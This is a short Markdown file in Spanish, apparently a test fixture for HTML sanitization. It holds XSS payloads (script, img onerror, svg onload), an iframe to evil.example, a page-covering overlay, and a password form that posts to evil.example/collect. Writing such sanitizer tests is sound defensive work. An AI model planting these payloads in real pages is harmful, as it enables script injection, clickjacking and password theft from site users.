# Documento con HTML hostil

<script>alert('xss')</script>

<img src=x onerror=alert('xss')>

<iframe src="https://evil.example"></iframe>

<div style="position:fixed;top:0;left:0;width:100vw;height:100vh">Capa que tapa todo</div>

<form action="https://evil.example/collect"><input name="password" type="password"></form>

<svg onload=alert('xss')></svg>

Texto legítimo después de todo lo anterior.
